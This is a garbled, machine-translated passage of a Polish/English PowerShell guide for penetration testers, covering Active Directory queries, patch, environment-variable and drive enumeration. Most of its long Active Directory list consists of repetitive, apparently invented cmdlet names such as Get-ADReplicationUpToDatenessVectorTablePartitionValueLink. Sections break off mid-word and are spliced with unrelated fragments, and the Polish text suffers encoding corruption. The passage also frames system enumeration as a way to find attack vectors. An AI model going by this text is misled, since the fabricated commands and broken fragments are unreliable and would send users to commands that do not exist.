Polecenie `Get-ADObject` pozwala na pobranie informacji o obiektach z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADObject -Identity ObjectName
```

### Polecenie Get-ADDomain

Polecenie `Get-ADDomain` pozwala na pobranie informacji o domenie z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADDomain
```

### Polecenie Get-ADForest

Polecenie `Get-ADForest` pozwala na pobranie informacji o lesie z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADForest
```

### Polecenie Get-ADTrust

Polecenie `Get-ADTrust` pozwala na pobranie informacji o zaufaniu z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADTrust
```

### Polecenie Get-ADDomainController

Polecenie `Get-ADDomainController` pozwala na pobranie informacji o kontrolerach domeny z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADDomainController
```

### Polecenie Get-ADReplicationSite

Polecenie `Get-ADReplicationSite` pozwala na pobranie informacji o witrynach replikacji z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADReplicationSite
```

### Polecenie Get-ADReplicationSubnet

Polecenie `Get-ADReplicationSubnet` pozwala na pobranie informacji o podsieciach replikacji z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADReplicationSubnet
```

### Polecenie Get-ADReplicationConnection

Polecenie `Get-ADReplicationConnection` pozwala na pobranie informacji o po≈ÇƒÖczeniach replikacji z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADReplicationConnection
```

### Polecenie Get-ADReplicationPartnerMetadata

Polecenie `Get-ADReplicationPartnerMetadata` pozwala na pobranie metadanych partnera replikacji z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADReplicationPartnerMetadata
```

### Polecenie Get-ADReplicationAttributeMetadata

Polecenie `Get-ADReplicationAttributeMetadata` pozwala na pobranie metadanych atrybutu replikacji z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADReplicationAttributeMetadata
```

### Polecenie Get-ADReplicationUpToDatenessVectorTable

Polecenie `Get-ADReplicationUpToDatenessVectorTable` pozwala na pobranie tabeli wektor√≥w aktualno≈õci replikacji z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADReplicationUpToDatenessVectorTable
```

### Polecenie Get-ADReplicationUpToDatenessVectorTablePartition

Polecenie `Get-ADReplicationUpToDatenessVectorTablePartition` pozwala na pobranie tabeli partycji wektor√≥w aktualno≈õci replikacji z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADReplicationUpToDatenessVectorTablePartition
```

### Polecenie Get-ADReplicationUpToDatenessVectorTableObject

Polecenie `Get-ADReplicationUpToDatenessVectorTableObject` pozwala na pobranie tabeli obiekt√≥w wektor√≥w aktualno≈õci replikacji z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADReplicationUpToDatenessVectorTableObject
```

### Polecenie Get-ADReplicationUpToDatenessVectorTableAttribute

Polecenie `Get-ADReplicationUpToDatenessVectorTableAttribute` pozwala na pobranie tabeli atrybut√≥w wektor√≥w aktualno≈õci replikacji z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADReplicationUpToDatenessVectorTableAttribute
```

### Polecenie Get-ADReplicationUpToDatenessVectorTableValue

Polecenie `Get-ADReplicationUpToDatenessVectorTableValue` pozwala na pobranie tabeli warto≈õci wektor√≥w aktualno≈õci replikacji z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADReplicationUpToDatenessVectorTableValue
```

### Polecenie Get-ADReplicationUpToDatenessVectorTableLink

Polecenie `Get-ADReplicationUpToDatenessVectorTableLink` pozwala na pobranie tabeli po≈ÇƒÖcze≈Ñ wektor√≥w aktualno≈õci replikacji z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADReplicationUpToDatenessVectorTableLink
```

### Polecenie Get-ADReplicationUpToDatenessVectorTableSite

Polecenie `Get-ADReplicationUpToDatenessVectorTableSite` pozwala na pobranie tabeli witryn wektor√≥w aktualno≈õci replikacji z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADReplicationUpToDatenessVectorTableSite
```

### Polecenie Get-ADReplicationUpToDatenessVectorTableServer

Polecenie `Get-ADReplicationUpToDatenessVectorTableServer` pozwala na pobranie tabeli serwer√≥w wektor√≥w aktualno≈õci replikacji z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADReplicationUpToDatenessVectorTableServer
```

### Polecenie Get-ADReplicationUpToDatenessVectorTableNamingContext

Polecenie `Get-ADReplicationUpToDatenessVectorTableNamingContext` pozwala na pobranie tabeli kontekst√≥w nazw wektor√≥w aktualno≈õci replikacji z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADReplicationUpToDatenessVectorTableNamingContext
```

### Polecenie Get-ADReplicationUpToDatenessVectorTablePartitionLink

Polecenie `Get-ADReplicationUpToDatenessVectorTablePartitionLink` pozwala na pobranie tabeli po≈ÇƒÖcze≈Ñ partycji wektor√≥w aktualno≈õci replikacji z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADReplicationUpToDatenessVectorTablePartitionLink
```

### Polecenie Get-ADReplicationUpToDatenessVectorTableObjectLink

Polecenie `Get-ADReplicationUpToDatenessVectorTableObjectLink` pozwala na pobranie tabeli po≈ÇƒÖcze≈Ñ obiekt√≥w wektor√≥w aktualno≈õci replikacji z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADReplicationUpToDatenessVectorTableObjectLink
```

### Polecenie Get-ADReplicationUpToDatenessVectorTableAttributeLink

Polecenie `Get-ADReplicationUpToDatenessVectorTableAttributeLink` pozwala na pobranie tabeli po≈ÇƒÖcze≈Ñ atrybut√≥w wektor√≥w aktualno≈õci replikacji z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADReplicationUpToDatenessVectorTableAttributeLink
```

### Polecenie Get-ADReplicationUpToDatenessVectorTableValueLink

Polecenie `Get-ADReplicationUpToDatenessVectorTableValueLink` pozwala na pobranie tabeli po≈ÇƒÖcze≈Ñ warto≈õci wektor√≥w aktualno≈õci replikacji z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADReplicationUpToDatenessVectorTableValueLink
```

### Polecenie Get-ADReplicationUpToDatenessVectorTableSiteLink

Polecenie `Get-ADReplicationUpToDatenessVectorTableSiteLink` pozwala na pobranie tabeli po≈ÇƒÖcze≈Ñ witryn wektor√≥w aktualno≈õci replikacji z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADReplicationUpToDatenessVectorTableSiteLink
```

### Polecenie Get-ADReplicationUpToDatenessVectorTableServerLink

Polecenie `Get-ADReplicationUpToDatenessVectorTableServerLink` pozwala na pobranie tabeli po≈ÇƒÖcze≈Ñ serwer√≥w wektor√≥w aktualno≈õci replikacji z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADReplicationUpToDatenessVectorTableServerLink
```

### Polecenie Get-ADReplicationUpToDatenessVectorTableNamingContextLink

Polecenie `Get-ADReplicationUpToDatenessVectorTableNamingContextLink` pozwala na pobranie tabeli po≈ÇƒÖcze≈Ñ kontekst√≥w nazw wektor√≥w aktualno≈õci replikacji z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADReplicationUpToDatenessVectorTableNamingContextLink
```

### Polecenie Get-ADReplicationUpToDatenessVectorTablePartitionObject

Polecenie `Get-ADReplicationUpToDatenessVectorTablePartitionObject` pozwala na pobranie tabeli obiekt√≥w partycji wektor√≥w aktualno≈õci replikacji z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADReplicationUpToDatenessVectorTablePartitionObject
```

### Polecenie Get-ADReplicationUpToDatenessVectorTablePartitionAttribute

Polecenie `Get-ADReplicationUpToDatenessVectorTablePartitionAttribute` pozwala na pobranie tabeli atrybut√≥w partycji wektor√≥w aktualno≈õci replikacji z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADReplicationUpToDatenessVectorTablePartitionAttribute
```

### Polecenie Get-ADReplicationUpToDatenessVectorTablePartitionValue

Polecenie `Get-ADReplicationUpToDatenessVectorTablePartitionValue` pozwala na pobranie tabeli warto≈õci partycji wektor√≥w aktualno≈õci replikacji z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADReplicationUpToDatenessVectorTablePartitionValue
```

### Polecenie Get-ADReplicationUpToDatenessVectorTablePartitionSite

Polecenie `Get-ADReplicationUpToDatenessVectorTablePartitionSite` pozwala na pobranie tabeli witryn partycji wektor√≥w aktualno≈õci replikacji z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADReplicationUpToDatenessVectorTablePartitionSite
```

### Polecenie Get-ADReplicationUpToDatenessVectorTablePartitionServer

Polecenie `Get-ADReplicationUpToDatenessVectorTablePartitionServer` pozwala na pobranie tabeli serwer√≥w partycji wektor√≥w aktualno≈õci replikacji z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADReplicationUpToDatenessVectorTablePartitionServer
```

### Polecenie Get-ADReplicationUpToDatenessVectorTablePartitionNamingContext

Polecenie `Get-ADReplicationUpToDatenessVectorTablePartitionNamingContext` pozwala na pobranie tabeli kontekst√≥w nazw partycji wektor√≥w aktualno≈õci replikacji z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADReplicationUpToDatenessVectorTablePartitionNamingContext
```

### Polecenie Get-ADReplicationUpToDatenessVectorTablePartitionObjectLink

Polecenie `Get-ADReplicationUpToDatenessVectorTablePartitionObjectLink` pozwala na pobranie tabeli po≈ÇƒÖcze≈Ñ obiekt√≥w partycji wektor√≥w aktualno≈õci replikacji z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADReplicationUpToDatenessVectorTablePartitionObjectLink
```

### Polecenie Get-ADReplicationUpToDatenessVectorTablePartitionAttributeLink

Polecenie `Get-ADReplicationUpToDatenessVectorTablePartitionAttributeLink` pozwala na pobranie tabeli po≈ÇƒÖcze≈Ñ atrybut√≥w partycji wektor√≥w aktualno≈õci replikacji z Active Directory. Mo≈ºna je u≈ºyƒá w nastƒôpujƒÖcy spos√≥b:

```powershell
Get-ADReplicationUpToDatenessVectorTablePartitionAttributeLink
```

### Polecenie Get-ADReplicationUpToDatenessVectorTablePartitionValueLink

Polecenie `Get-AD
```powershell
Get-Acl -Path "C:\Program Files\Vuln Services" | fl
```
## Wersja systemu operacyjnego i poprawki

Aby uzyskaƒá informacje o wersji systemu operacyjnego i zainstalowanych poprawkach, mo≈ºemy u≈ºyƒá nastƒôpujƒÖcego polecenia w PowerShell:

```powershell
(Get-WmiObject -Class Win32_OperatingSystem).Caption
```

Ten kod zwr√≥ci nazwƒô i wersjƒô systemu operacyjnego.

Aby uzyskaƒá informacje o zainstalowanych poprawkach, mo≈ºemy u≈ºyƒá polecenia:

```powershell
Get-HotFix
```

To polecenie wy≈õwietli listƒô zainstalowanych poprawek wraz z ich identyfikatorami, opisami i datami instalacji.

Pamiƒôtaj, ≈ºe niekt√≥re poprawki mogƒÖ byƒá ukryte lub nie wy≈õwietlaƒá siƒô w wynikach. Aby uzyskaƒá pe≈ÇnƒÖ listƒô poprawek, mo≈ºemy u≈ºyƒá polecenia:

```powershell
Get-HotFix -All
```

To polecenie wy≈õwietli wszystkie poprawki, w tym te ukryte.
```powershell
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
## ≈örodowisko

---

## Basic PowerShell for Pentesters

---

## Podstawy PowerShell dla pentester√≥w

---

This section covers some basic PowerShell commands and techniques that can be useful for pentesters during their engagements. It is important to have a good understanding of PowerShell as it is a powerful scripting language that can be used for various purposes, including offensive security.

---

Ta sekcja omawia podstawowe polecenia i techniki PowerShell, kt√≥re mogƒÖ byƒá przydatne dla pentester√≥w podczas ich zada≈Ñ. Wa≈ºne jest, aby dobrze zrozumieƒá PowerShell, poniewa≈º jest to potƒô≈ºny jƒôzyk skryptowy, kt√≥ry mo≈ºe byƒá u≈ºywany do r√≥≈ºnych cel√≥w, w tym do bezpiecze≈Ñstwa ofensywnego.

---

### PowerShell Basics

---

### Podstawy PowerShell

---

#### Running PowerShell Commands

---

#### Wykonywanie polece≈Ñ PowerShell

---

PowerShell commands can be executed in a number of ways. The most common way is to open a PowerShell console and type the command directly. Another way is to run a PowerShell script file that contains the desired commands. Additionally, PowerShell commands can also be executed from within other scripting languages such as Python or batch files.

---

Polecenia PowerShell mo≈ºna wykonywaƒá na kilka sposob√≥w. Najczƒôstszym sposobem jest otwarcie konsoli PowerShell i wpisanie polecenia bezpo≈õrednio. Innym sposobem jest uruchomienie pliku skryptu PowerShell, kt√≥ry zawiera ≈ºƒÖdane polecenia. Dodatkowo, polecenia PowerShell mo≈ºna r√≥wnie≈º wykonywaƒá z innych jƒôzyk√≥w skryptowych, takich jak Python lub pliki wsadowe.

---

#### Getting Help

---

#### Uzyskiwanie pomocy

---

PowerShell provides a built-in help system that can be used to get information about commands, modules, and other PowerShell features. The `Get-Help` command is used to access the help system. For example, to get help on a specific command, you can use the following syntax:

```
Get-Help <command>
```

---

PowerShell udostƒôpnia wbudowany system pomocy, kt√≥ry mo≈ºna u≈ºywaƒá do uzyskiwania informacji o poleceniach, modu≈Çach i innych funkcjach PowerShell. Polecenie `Get-Help` s≈Çu≈ºy do uzyskiwania dostƒôpu do systemu pomocy. Na przyk≈Çad, aby uzyskaƒá pomoc dotyczƒÖcƒÖ konkretnego polecenia, mo≈ºna u≈ºyƒá nastƒôpujƒÖcej sk≈Çadni:

```
Get-Help <polecenie>
```

---

#### Running PowerShell Scripts

---

#### Wykonywanie skrypt√≥w PowerShell

---

PowerShell scripts are text files that contain a series of PowerShell commands. These scripts can be executed by running the `.\` followed by the script file name. For example, if the script file is named `script.ps1`, you can run it using the following syntax:

```
.\script.ps1
```

---

Skrypty PowerShell to pliki tekstowe zawierajƒÖce seriƒô polece≈Ñ PowerShell. Skrypty te mo≈ºna uruchomiƒá, uruchamiajƒÖc `.\` a nastƒôpnie nazwƒô pliku skryptu. Na przyk≈Çad, je≈õli plik skryptu ma nazwƒô `skrypt.ps1`, mo≈ºna go uruchomiƒá, u≈ºywajƒÖc nastƒôpujƒÖcej sk≈Çadni:

```
.\skrypt.ps1
```

---

#### PowerShell Execution Policy

---

#### Polityka wykonywania PowerShell

---

PowerShell has an execution policy that determines whether scripts can be run and what types of scripts are allowed. The execution policy can be set to one of the following values:

- Restricted: No scripts are allowed to run.
- AllSigned: Only scripts signed by a trusted publisher are allowed to run.
- RemoteSigned: Scripts downloaded from the internet must be signed by a trusted publisher, but local scripts can run without a signature.
- Unrestricted: All scripts can run, regardless of their signature.

To check the current execution policy, you can use the following command:

```
Get-ExecutionPolicy
```

To change the execution policy, you can use the following command:

```
Set-ExecutionPolicy <policy>
```

---

PowerShell ma politykƒô wykonywania, kt√≥ra okre≈õla, czy skrypty mogƒÖ byƒá uruchamiane i jakie rodzaje skrypt√≥w sƒÖ dozwolone. Polityka wykonywania mo≈ºe mieƒá jednƒÖ z nastƒôpujƒÖcych warto≈õci:

- Restricted: Nie mo≈ºna uruchamiaƒá ≈ºadnych skrypt√≥w.
- AllSigned: Tylko skrypty podpisane przez zaufanego wydawcƒô sƒÖ dozwolone do uruchomienia.
- RemoteSigned: Skrypty pobrane z internetu muszƒÖ byƒá podpisane przez zaufanego wydawcƒô, ale lokalne skrypty mogƒÖ byƒá uruchamiane bez podpisu.
- Unrestricted: Wszystkie skrypty mogƒÖ byƒá uruchamiane, niezale≈ºnie od ich podpisu.

Aby sprawdziƒá bie≈ºƒÖcƒÖ politykƒô wykonywania, mo≈ºna u≈ºyƒá nastƒôpujƒÖcego polecenia:

```
Get-ExecutionPolicy
```

Aby zmieniƒá politykƒô wykonywania, mo≈ºna u≈ºyƒá nastƒôpujƒÖcego polecenia:

```
Set-ExecutionPolicy <polityka>
```

---

#### PowerShell Modules

---

#### Modu≈Çy PowerShell

---

PowerShell modules are collections of cmdlets, functions, and scripts that can be used to extend the functionality of PowerShell. Modules can be imported into a PowerShell session using the `Import-Module` command. Once a module is imported, its cmdlets, functions, and scripts can be used just like any other PowerShell command.

To import a module, you can use the following command:

```
Import-Module <module>
```

To list all imported modules, you can use the following command:

```
Get-Module
```

---

Modu≈Çy PowerShell to zbiory cmdlet√≥w, funkcji i skrypt√≥w, kt√≥re mo≈ºna u≈ºywaƒá do rozszerzania funkcjonalno≈õci PowerShell. Modu≈Çy mo≈ºna importowaƒá do sesji PowerShell za pomocƒÖ polecenia `Import-Module`. Po zaimportowaniu modu≈Çu, jego cmdlety, funkcje i skrypty mo≈ºna u≈ºywaƒá tak samo jak dowolne inne polecenie PowerShell.

Aby zaimportowaƒá modu≈Ç, mo≈ºna u≈ºyƒá nastƒôpujƒÖcego polecenia:

```
Import-Module <modu≈Ç>
```

Aby wy≈õwietliƒá listƒô wszystkich zaimportowanych modu≈Ç√≥w, mo≈ºna u≈ºyƒá nastƒôpujƒÖcego polecenia:

```
Get-Module
```

---

### PowerShell Techniques

---

### Techniki PowerShell

---

#### Command Execution

---

#### Wykonywanie polece≈Ñ

---

PowerShell can be used to execute commands on a remote system using various techniques. One common technique is to use the `Invoke-Command` cmdlet, which allows you to run commands on remote systems that have PowerShell remoting enabled. For example, to execute a command on a remote system, you can use the following syntax:

```
Invoke-Command -ComputerName <computer> -ScriptBlock { <command> }
```

---

PowerShell mo≈ºe byƒá u≈ºywany do wykonywania polece≈Ñ na zdalnym systemie za pomocƒÖ r√≥≈ºnych technik. JednƒÖ z popularnych technik jest u≈ºycie polecenia `Invoke-Command`, kt√≥re umo≈ºliwia uruchamianie polece≈Ñ na zdalnych systemach, na kt√≥rych jest w≈ÇƒÖczone zdalne zarzƒÖdzanie PowerShell. Na przyk≈Çad, aby wykonaƒá polecenie na zdalnym systemie, mo≈ºna u≈ºyƒá nastƒôpujƒÖcej sk≈Çadni:

```
Invoke-Command -ComputerName <komputer> -ScriptBlock { <polecenie> }
```

---

#### File Operations

---

#### Operacje na plikach

---

PowerShell provides a number of cmdlets that can be used to perform file operations such as creating, copying, moving, and deleting files. Some of the commonly used cmdlets for file operations include `New-Item`, `Copy-Item`, `Move-Item`, and `Remove-Item`. For example, to create a new file, you can use the following syntax:

```
New-Item -Path <path> -ItemType File
```

---

PowerShell udostƒôpnia wiele cmdlet√≥w, kt√≥re mo≈ºna u≈ºywaƒá do wykonywania operacji na plikach, takich jak tworzenie, kopiowanie, przenoszenie i usuwanie plik√≥w. Niekt√≥re z czƒôsto u≈ºywanych cmdlet√≥w do operacji na plikach to `New-Item`, `Copy-Item`, `Move-Item` i `Remove-Item`. Na przyk≈Çad, aby utworzyƒá nowy plik, mo≈ºna u≈ºyƒá nastƒôpujƒÖcej sk≈Çadni:

```
New-Item -Path <≈õcie≈ºka> -ItemType File
```

---

#### Registry Operations

---

#### Operacje na rejestrze

---

PowerShell can also be used to perform operations on the Windows registry. The `Get-Item`, `Set-Item`, and `Remove-Item` cmdlets can be used to retrieve, modify, and delete registry keys and values. For example, to get the value of a registry key, you can use the following syntax:

```
Get-Item -Path <path>
```

---

PowerShell mo≈ºe r√≥wnie≈º byƒá u≈ºywany do wykonywania operacji na rejestrze systemu Windows. Do pobierania, modyfikowania i usuwania kluczy i warto≈õci rejestru mo≈ºna u≈ºywaƒá cmdlet√≥w `Get-Item`, `Set-Item` i `Remove-Item`. Na przyk≈Çad, aby pobraƒá warto≈õƒá klucza rejestru, mo≈ºna u≈ºyƒá nastƒôpujƒÖcej sk≈Çadni:

```
Get-Item -Path <≈õcie≈ºka>
```

---

#### Network Operations

---

#### Operacje sieciowe

---

PowerShell can be used to perform various network operations such as pinging a remote host, resolving hostnames to IP addresses, and retrieving information about network interfaces. The `Test-Connection`, `Resolve-DnsName`, and `Get-NetAdapter` cmdlets can be used for these purposes. For example, to ping a remote host, you can use the following syntax:

```
Test-Connection -ComputerName <host>
```

---

PowerShell mo≈ºe byƒá u≈ºywany do wykonywania r√≥≈ºnych operacji sieciowych, takich jak pingowanie zdalnego hosta, rozwiƒÖzywanie nazw host√≥w na adresy IP i pobieranie informacji o interfejsach sieciowych. Do tego celu mo≈ºna u≈ºywaƒá cmdlet√≥w `Test-Connection`, `Resolve-DnsName` i `Get-NetAdapter`. Na przyk≈Çad, aby wykonaƒá ping zdalnego hosta, mo≈ºna u≈ºyƒá nastƒôpujƒÖcej sk≈Çadni:

```
Test-Connection -ComputerName <host>
```

---

#### Process Management

---

#### ZarzƒÖdzanie procesami

---

PowerShell provides cmdlets that can be used to manage processes running on a system. The `Get-Process`, `Start-Process`, and `Stop-Process` cmdlets can be used to retrieve information about running processes, start new processes, and stop running processes, respectively. For example, to get a list of running processes, you can use the following command:

```
Get-Process
```

---

PowerShell udostƒôpnia cmdlety, kt√≥re mo≈ºna u≈ºywaƒá do zarzƒÖdzania procesami uruchomionymi na systemie. Do pobierania informacji o uruchomionych procesach, uruchamiania nowych proces√≥w i zatrzymywania uruchomionych proces√≥w mo≈ºna u≈ºywaƒá cmdlet√≥w `Get-Process`, `Start-Process` i `Stop-Process` odpowiednio. Na przyk≈Çad, aby uzyskaƒá listƒô uruchomionych proces√≥w, mo≈ºna u≈ºyƒá nastƒôpujƒÖcego polecenia:

```
Get-Process
```

---

#### User Management

---

#### ZarzƒÖdzanie u≈ºytkownikami

---

PowerShell can be used to manage user accounts on a Windows system. The `Get-LocalUser`, `New-LocalUser`, `Set-LocalUser`, and `Remove-LocalUser` cmdlets can be used to retrieve information about local users, create new local users, modify existing local users, and remove local users, respectively. For example, to create a new local user, you can use the following syntax:

```
New-LocalUser -Name <name> -Password (ConvertTo-SecureString -String <password> -AsPlainText -Force)
```

---

PowerShell mo≈ºe byƒá u≈ºywany do zarzƒÖdzania kontami u≈ºytkownik√≥w w systemie Windows. Do pobierania informacji o lokalnych u≈ºytkownikach, tworzenia nowych lokalnych u≈ºytkownik√≥w, modyfikowania istniejƒÖcych lokalnych u≈ºytkownik√≥w i usuwania lokalnych u≈ºytkownik√≥w mo≈ºna u≈ºywaƒá cmdlet√≥w `Get-LocalUser`, `New-LocalUser`, `Set-LocalUser` i `Remove-LocalUser` odpowiednio. Na przyk≈Çad, aby utworzyƒá nowego lokalnego u≈ºytkownika, mo≈ºna u≈ºyƒá nastƒôpujƒÖcej sk≈Çadni:

```
New-LocalUser -Name <nazwa> -Password (ConvertTo-SecureString -String <has≈Ço> -AsPlainText -Force)
```

---

#### Service Management

---

#### ZarzƒÖdzanie us≈Çugami

---

PowerShell can be used to manage services running on a Windows system. The `Get-Service`, `Start-Service`, `Stop-Service`, and `Restart-Service` cmdlets can be used to retrieve information about services, start services, stop services, and restart services, respectively. For example, to get a list of running services, you can use the following command:

```
Get-Service
```

---

PowerShell mo≈ºe byƒá u≈ºywany do zarzƒÖdzania us≈Çugami uruchomionymi na systemie Windows. Do pobierania informacji o us≈Çugach, uruchamiania us≈Çug, zatrzymywania us≈Çug i ponownego uruchamiania us≈Çug mo≈ºna u≈ºywaƒá cmdlet√≥w `Get-Service`, `Start-Service`, `Stop-Service` i `Restart-Service` odpowiednio. Na przyk≈Çad, aby uzyskaƒá listƒô uruchomionych us≈Çug, mo≈ºna u≈ºyƒá nastƒôpujƒÖcego polecenia:

```
Get-Service
```

---

#### Event Log Management

---

#### ZarzƒÖdzanie dziennikami zdarze≈Ñ

---

PowerShell can be used to manage event logs on a Windows system. The `Get-EventLog`, `New-EventLog`, `Remove-EventLog`, and `Clear-EventLog` cmdlets can be used to retrieve information about event logs, create new event logs, remove event logs, and clear event logs, respectively. For example, to get a list of available event logs, you can use the following command:

```
Get-EventLog -List
```

---

PowerShell mo≈ºe byƒá u≈ºywany do zarzƒÖdzania dziennikami zdarze≈Ñ w systemie Windows. Do pobierania informacji o dziennikach zdarze≈Ñ, tworzenia nowych dziennik√≥w zdarze≈Ñ, usuwania dziennik√≥w zdarze≈Ñ i czyszczenia dziennik√≥w zdarze≈Ñ mo≈ºna u≈ºywaƒá cmdlet√≥w `Get-EventLog`, `New-EventLog`, `Remove-EventLog` i `Clear-EventLog` odpowiednio. Na przyk≈Çad, aby uzyskaƒá listƒô dostƒôpnych dziennik√≥w zdarze≈Ñ, mo≈ºna u≈ºyƒá nastƒôpujƒÖcego polecenia:

```
Get-EventLog -List
```

---

#### System Information

---

#### Informacje o systemie

---

PowerShell can be used to retrieve information about the Windows system. The `Get-WmiObject`, `Get-ComputerInfo`, and `Get-CimInstance` cmdlets can be used to retrieve various system information such as hardware details, operating system information, and network configuration. For example, to get the operating system information, you can use the following command:

```
Get-WmiObject -Class Win32_OperatingSystem
```

---

PowerShell mo≈ºe byƒá u≈ºywany do pobierania informacji o systemie Windows. Do pobierania r√≥≈ºnych informacji o systemie, takich jak szczeg√≥≈Çy sprzƒôtu, informacje o systemie operacyjnym i konfiguracja sieci, mo≈ºna u≈ºywaƒá cmdlet√≥w `Get-WmiObject`, `Get-ComputerInfo` i `Get-CimInstance`. Na przyk≈Çad, aby uzyskaƒá informacje o systemie operacyjnym, mo≈ºna u≈ºyƒá nastƒôpujƒÖcego polecenia:

```
Get-WmiObject -Class Win32_OperatingSystem
```

---

#### PowerShell Remoting

---

#### Zdalne zarzƒÖdzanie PowerShell

---

PowerShell remoting allows you to run PowerShell commands on remote systems. To enable PowerShell remoting on a system, you can use the `Enable-PSRemoting` cmdlet. Once remoting is enabled, you can use the `Enter-PSSession` cmdlet to establish a remote PowerShell session with a remote system. For example, to enter a remote session, you can use the following command:

```
Enter-PSSession -ComputerName <computer>
```

---

Zdalne zarzƒÖdzanie PowerShell umo≈ºliwia uruchamianie polece≈Ñ PowerShell na zdalnych systemach. Aby w≈ÇƒÖczyƒá zdalne zarzƒÖdzanie PowerShell na systemie, mo≈ºna u≈ºyƒá cmdletu `Enable-PSRemoting`. Po w≈ÇƒÖczeniu zdalnego zarzƒÖdzania mo≈ºna u≈ºyƒá cmdletu `
```powershell
Get-ChildItem Env: | ft Key,Value #get all values
$env:UserName @Get UserName value
```
## Inne pod≈ÇƒÖczone dyski

When conducting a penetration test on a Windows system, it is important to gather information about other connected drives. This can help in identifying potential vulnerabilities and accessing sensitive data.

### PowerShell Command

To retrieve information about other connected drives, you can use the following PowerShell command:

```powershell
Get-PSDrive -PSProvider 'FileSystem' | Where-Object {$_.Root -ne $null} | Select-Object Name, Root, Used, Free
```

This command uses the `Get-PSDrive` cmdlet to retrieve all drives connected to the system. The `Where-Object` cmdlet filters out drives with a null root, which typically indicates network or virtual drives. The `Select-Object` cmdlet is used to display the name, root, used space, and free space of the drives.

### Example Output

Here is an example output of the PowerShell command:

```
Name Root Used  Free
---- ---- ----  ----
C    C:\  100GB 50GB
D    D:\  200GB 100GB
```

This output shows that there are two connected drives: `C:` and `D:`. The `C:` drive has 100GB used and 50GB free space, while the `D:` drive has 200GB used and 100GB free space.

By gathering information about other connected drives, you can gain a better understanding of the system's storage configuration and potentially discover additional attack vectors or sensitive data.
```powershell
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
### Kosz

Kosz to specjalny folder w systemie Windows, w kt√≥rym przechowywane sƒÖ usuniƒôte pliki i foldery. Domy≈õlnie, gdy plik jest usuniƒôty, trafia on do kosza, zamiast natychmiastowo zostawaƒá trwale usuniƒôtym z systemu. Kosz umo≈ºliwia przywr√≥cenie usuniƒôtych plik√≥w, je≈õli zostanƒÖ one przypadkowo usuniƒôte lub je≈õli u≈ºytkownik zmieni zdanie.

W celu przywr√≥cenia pliku z kosza, wystarczy otworzyƒá kosz, znale≈∫ƒá ≈ºƒÖdany plik i kliknƒÖƒá opcjƒô przywr√≥cenia. Plik zostanie automatycznie przeniesiony z powrotem do swojego pierwotnego miejsca.

Warto zauwa≈ºyƒá, ≈ºe kosz ma ograniczonƒÖ pojemno≈õƒá, co oznacza, ≈ºe ‚Äã‚Äãje≈õli przekroczy on okre≈õlony rozmiar, najstarsze pliki zostanƒÖ automatycznie usuniƒôte, aby zrobiƒá miejsce dla nowych. Mo≈ºna r√≥wnie≈º trwale usunƒÖƒá pliki z kosza, aby zwolniƒá miejsce na dysku.
```powershell
$shell = New-Object -com shell.application
$rb = $shell.Namespace(10)
